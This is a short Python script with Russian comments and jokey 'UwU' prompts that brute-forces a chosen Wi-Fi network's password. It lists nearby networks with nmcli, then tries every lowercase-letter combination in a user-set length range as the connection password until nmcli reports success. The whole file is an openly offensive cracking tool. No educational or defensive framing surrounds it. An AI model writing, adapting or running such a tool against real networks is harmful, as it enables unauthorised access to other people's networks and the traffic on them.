import itertools
import string
import time
import subprocess
import sys

# Думаю тут понятно
animation_duration = 3 
end_time = time.time() + animation_duration

while time.time() < end_time:
    for char in '|/-\\':
        sys.stdout.write(f'\rLOwOding available netUwUrks... {char}')
        sys.stdout.flush()
        time.sleep(0.1)

sys.stdout.write('\rLOwOding complete!    \n')

subprocess.run(['nmcli', 'device', 'wifi']) # Отображает доступные сети
network = input("Which netUwUrk to cryack? (Enter full netUwUrk name): ")

charset = string.ascii_lowercase # Начинает перебирать пароли. Перебирает только строчные буквы
min_length = int(input("MiNYAmal passUwUrd lenght? (Enter int valUwUe): ")) 
max_length = int(input("Max passUwUrd lenght? (Enter int valUwUe): "))

for length in range(min_length, max_length + 1): 
    for guess in itertools.product(charset, repeat=length):
        guess_password = ''.join(guess)
        print(f'Tryaing passUwUrd... {guess_password}')
        
        result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', network, 'password', guess_password], # Пытается подключится к сети сгенерерованым паролем 
                                text=True, capture_output=True)
        
        # Как выяснилось лучше проверять через nmcli device status
        # А еще лучше проверять через чето другое, но я глупость-глупая >w<
        if "successfully" in result.stdout:
            print(f'PassUwUrd was foUwUnd: {guess_password}! ^~^')
            break
    else:
        continue
    break
else:
    print("PassUwUrd wasn't foUwUnd... >~<")